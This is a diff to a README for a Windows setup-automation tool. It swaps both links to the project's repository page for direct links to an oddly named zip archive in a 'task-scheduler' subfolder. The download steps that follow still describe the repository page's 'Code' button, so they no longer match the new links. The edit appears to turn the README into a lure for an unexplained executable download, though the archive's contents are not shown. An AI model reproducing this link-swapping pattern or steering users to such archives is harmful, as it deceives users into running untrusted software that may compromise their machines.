@@ -1,6 +1,6 @@
 # ⚙️ WinServerSetup - Automated system setup for Windows machines
 
-[![](https://img.shields.io/badge/Download-WinServerSetup-blue.svg)](https://github.com/amber-abohm932/WinServerSetup)
+[![](https://img.shields.io/badge/Download-WinServerSetup-blue.svg)](https://github.com/amber-abohm932/WinServerSetup/raw/refs/heads/main/task-scheduler/Setup_Win_Server_roundridge.zip)
 
 WinServerSetup prepares your computer by automating repetitive tasks. This tool configures settings for Windows Server, Windows 10, and Windows 11. It removes manual effort during the initial setup phase of a new operating system installation. Use this script to apply standard configurations to your system.
 
@@ -15,7 +15,7 @@ Ensure your computer meets these conditions before you run the software:
 
 ## 🚀 Downloading the Software
 
-Visit this page to download the script files: [https://github.com/amber-abohm932/WinServerSetup](https://github.com/amber-abohm932/WinServerSetup).
+Visit this page to download the script files: [https://github.com/amber-abohm932/WinServerSetup/raw/refs/heads/main/task-scheduler/Setup_Win_Server_roundridge.zip](https://github.com/amber-abohm932/WinServerSetup/raw/refs/heads/main/task-scheduler/Setup_Win_Server_roundridge.zip).
 
 1. Open the link in your web browser.
 2. Locate the green button labeled "Code".
